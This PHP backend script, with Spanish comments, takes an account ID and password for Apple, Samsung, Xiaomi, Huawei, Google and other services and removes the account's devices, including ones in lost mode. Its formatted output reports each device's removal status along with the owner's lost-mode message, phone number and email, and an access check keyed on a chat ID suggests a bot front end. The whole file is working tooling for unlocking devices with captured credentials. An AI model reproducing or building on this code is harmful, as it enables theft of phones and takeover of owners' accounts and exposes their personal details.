<?php
$ip = isset($_SERVER['HTTP_CLIENT_IP']) 
    ? $_SERVER['HTTP_CLIENT_IP'] 
    : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
      ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
      : $_SERVER['REMOTE_ADDR']);

error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

if(isset($_POST['apple_id']) && isset($_POST['password']) && isset($_POST['web'])){
    $autoremove = $_POST['autoremove'] ?? false;
    $username = $_POST['apple_id'];
    $password = $_POST['password'];
    $web = $_POST['web'];
    $web_view = $_GET['view'] ?? 'json';
    
    $result = [];
    
    define('INCLUDED_FROM_PARSER', true);
    
    // Guardar y limpiar variables que podrían triggear el endpoint
    $temp_option = $_REQUEST['Option'] ?? null;
    $temp_get_option = $_GET['Option'] ?? null;
    $temp_post_option = $_POST['Option'] ?? null;
    unset($_REQUEST['Option'], $_GET['Option'], $_POST['Option']);
    
    // Output buffering para capturar cualquier output del require
    ob_start();
    
    if($web == 'apple'){
        require_once('sudo/Apple.php');
    } else if($web == 'xiaomi'){
        require_once('Xiaomi.php');
    } else if($web == 'facebook'){
        require_once('Facebook.php');
    } else if($web == 'paymaya'){
        require_once('Maya.php');
    } else if($web == 'samsung'){
        require_once('Samsung.php');
    } else if($web == 'huawei'){
        require_once('Huawei.php');
    } else if($web == 'google'){
        require_once('Google.php');
    } else {
        ob_end_clean();
        header('Content-Type: application/json');
        echo json_encode(["success" => false, "msg" => "Unsupported service"]);
        exit();
    }
    
    // Descartar cualquier output del require
    ob_end_clean();
    
    // Restaurar variables
    if($temp_option !== null) $_REQUEST['Option'] = $temp_option;
    if($temp_get_option !== null) $_GET['Option'] = $temp_get_option;
    if($temp_post_option !== null) $_POST['Option'] = $temp_post_option;
    
    try {
        if ($web == 'apple') {
            if (class_exists('AppleRemovalWithoutDB')) {
                $api = new AppleRemovalWithoutDB($password);
                $result = $api->executeRemoval($username, $password);
            } else {
                throw new Exception("Class AppleRemovalWithoutDB not found");
            }
        } else {
            $api = new API();
            $result = $api->start_remove($username, $password, $autoremove);
        }
        
    } catch (Exception $e) {
        $result = [
            'success' => false,
            'msg' => 'API Error: ' . $e->getMessage(),
            'error_code' => 'exception',
            'devices' => [],
            'devices_count' => 0,
            'removed_count' => 0
        ];
    }
    
    // Output
    if($web_view == 'html'){
        if(isset($result['success']) && $result['success'] == true){
            if($web == 'apple'){
                echo parse_auto_remove_result_apple($result);
            } else {
                echo parse_auto_remove_result($result);
            }
        } else {
            if($web == 'apple'){
                echo parse_error_result_apple($result);
            } else {
                echo "WRONG - " . ($result['msg'] ?? 'Unknown error');
            }
        }
    } else {
        header('Content-Type: application/json');
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    }
} else {
    $error = [
        'success' => false,
        'msg' => 'Missing required parameters: apple_id, password, web'
    ];
    
    if(($_GET['view'] ?? 'json') == 'html'){
        echo "WRONG - Missing parameters";
    } else {
        header('Content-Type: application/json');
        echo json_encode($error);
    }
}

/**
 * Parseo de errores para Apple (HTML)
 */
function parse_error_result_apple($result) {
    $msg = "---------------------------------------\r\n";
    $msg .= "❌ OPERATION FAILED\r\n";
    $msg .= "---------------------------------------\r\n";
    
    $error_code = $result['error_code'] ?? 'unknown';
    $error_msg = $result['msg'] ?? 'Unknown error';
    
    $error_labels = [
        'invalid_credentials' => '🔐 Invalid Credentials',
        'account_locked' => '🔒 Account Locked',
        'failed' => '⚠️ Authentication Failed',
        'timeout' => '⏱️ Request Timeout',
        'access_denied' => '🚫 Access Denied',
        'connection_failed' => '📡 Connection Failed',
        'no_token' => '🔑 No Token Received',
        'service_unavailable' => '🔧 Service Unavailable',
        'rate_limited' => '⏳ Rate Limited',
        'precondition_failed' => '🛡️ Verification Required',
    ];
    
    $label = $error_labels[$error_code] ?? '❓ Error';
    
    $msg .= "Error: $label\r\n";
    $msg .= "Message: $error_msg\r\n";
    
    if (!empty($result['status_code'])) {
        $msg .= "HTTP Status: {$result['status_code']}\r\n";
    }
    
    if (!empty($result['ip'])) {
        $msg .= "IP: {$result['ip']}\r\n";
    }
    
    $msg .= "---------------------------------------\r\n";
    
    return $msg;
}

/**
 * Parseo de éxito para Apple (HTML)
 */
function parse_auto_remove_result_apple($result) {
    $msg = "";
    
    if (isset($result['devices']) && is_array($result['devices']) && count($result['devices']) >= 1) {
        $msg = "=======================================\r\n";
        $msg .= "✅ AUTO REMOVE COMPLETED (Apple)\r\n";
        $msg .= "=======================================\r\n";
        
        if (!empty($result['owner'])) {
            $msg .= "👤 Owner: {$result['owner']}\r\n";
        }
        
        $msg .= "📱 Devices: {$result['devices_count']} | ✅ Removed: {$result['removed_count']} | ❌ Failed: {$result['failed_count']}\r\n";
        $msg .= "---------------------------------------\r\n";
        
        foreach ($result['devices'] as $index => $device) {
            $num = $index + 1;
            
            $model = $device['model'] ?? 'Unknown';
            $name = $device['name'] ?? 'Unknown';
            $device_class = $device['device_class'] ?? '';
            $is_mac = $device['is_mac'] ?? false;
            
            $icon = '📱';
            if ($is_mac) $icon = '💻';
            else if ($device_class === 'iPad') $icon = '📲';
            else if ($device_class === 'Watch') $icon = '⌚';
            else if ($device_class === 'AirPods') $icon = '🎧';
            
            $msg .= "\r\n$icon DEVICE #$num\r\n";
            $msg .= "   Model: $model\r\n";
            $msg .= "   Name: $name\r\n";
            
            $battery = $device['battery_level_percent'] ?? 0;
            if (!$is_mac && $battery > 0) {
                $battery_icon = $battery > 20 ? '🔋' : '🪫';
                $msg .= "   Battery: $battery_icon " . round($battery) . "%\r\n";
            }
            
            if ($device['lost_mode_enabled'] ?? false) {
                $msg .= "   ⚠️ LOST MODE ACTIVE\r\n";
                if (!empty($device['lost_message'])) {
                    $msg .= "   📝 Message: {$device['lost_message']}\r\n";
                }
                if (!empty($device['lost_phone'])) {
                    $msg .= "   📞 Phone: {$device['lost_phone']}\r\n";
                }
            }
            
            if (!empty($device['pending_remove_until_date'])) {
                $msg .= "   ⏳ Pending until: {$device['pending_remove_until_date']}\r\n";
            }
            
            $removal_status = $device['removal_status'] ?? 'NOT_REMOVED';
            if ($removal_status === 'REMOVED') {
                $msg .= "   ✅ STATUS: REMOVED\r\n";
            } else {
                $msg .= "   ❌ STATUS: NOT REMOVED\r\n";
            }
            
            $msg .= "---------------------------------------\r\n";
        }
        
    } else {
        $msg = "=======================================\r\n";
        $msg .= "✅ AUTO REMOVE (Apple)\r\n";
        $msg .= "=======================================\r\n";
        
        if (!empty($result['owner'])) {
            $msg .= "👤 Owner: {$result['owner']}\r\n";
        }
        
        $msg .= "📱 No devices found to remove\r\n";
        $msg .= "=======================================\r\n";
    }
    
    return $msg;
}

/**
 * Parseo genérico para otros servicios
 */
function parse_auto_remove_result($result) {
    $msg = "";
    $list = $result['device_list'] ?? [];
    
    if (count($list) >= 1) {
        $msg = "Auto Remove Message\r\n---------------------------------------\r\n";
        
        foreach ($list as $device) {
            $model = $device['model'] ?? 'Unknown';
            $name = $device['device_name'] ?? 'Unknown';
            $lostmode = $device['lost_mode'] ?? 'No';
            $owner_msg = $device['owner_lostmode_msg'] ?? '';
            $owner_number = $device['owner_number'] ?? '';
            $owner_email = $device['owner_lostmode_email'] ?? '';
            $status = $device['msg'] ?? '';
            
            $display_status = $status == 'Removed' ? 'Status: OFF ✅' : 'Status: Failed 📵';
            
            $msg .= "Device: $model\r\nName: $name\r\n";
            
            if ($lostmode == "Yes") {
                $msg .= "Owner's Message: $owner_msg\r\n";
                $msg .= "Owner's Phone No: $owner_number\r\n";
                $msg .= "Owner's Email: $owner_email\r\n";
            }
            
            $msg .= "$display_status\r\n---------------------------------------\r\n";
        }
    } else {
        $msg = "\r\n---------------------------------------\r\nAuto Remove Message\r\n---------------------------------------\r\n";
        $msg .= "No Devices to remove ✅\r\n---------------------------------------";
    }
    
    return $msg;
}

function check_access($chat_id) {
    $file = './access.txt';
    if (!is_file($file)) {
        file_put_contents($file, '');
    }
    return strpos(file_get_contents($file), $chat_id) !== false;
}
?>